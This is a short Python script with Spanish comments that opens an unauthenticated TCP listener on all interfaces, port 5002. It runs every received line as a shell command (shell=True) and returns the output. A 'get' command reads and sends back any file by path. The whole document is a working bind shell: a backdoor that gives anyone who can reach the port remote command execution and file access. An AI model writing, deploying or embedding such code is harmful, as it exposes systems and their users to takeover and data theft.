import socket
import subprocess
import os

HOST = "0.0.0.0"
PORT = 5002

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen()
    print(f"Servidor escuchando en {HOST}:{PORT}")

    conn, addr = server_socket.accept()
    with conn:
        print(f"Conectado por {addr}")

        while True:
            data = conn.recv(4096).decode()
            if not data or data.lower() == "salir":
                break

            # Separar comando y argumento
            partes = data.split(maxsplit=1)
            comando = partes[0]
            argumento = partes[1] if len(partes) > 1 else ""

            salida = b""

            try:
                if comando == "get":
                    # Enviar contenido de un archivo
                    if os.path.exists(argumento):
                        with open(argumento, "rb") as f:
                            salida = f.read()
                    else:
                        salida = f"Archivo '{argumento}' no existe.".encode()
                else:
                    # Ejecutar cualquier otro comando con sus argumentos
                    salida = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                salida = e.output
            except Exception as e:
                salida = str(e).encode()

            # Enviar la salida al cliente
            conn.sendall(salida)
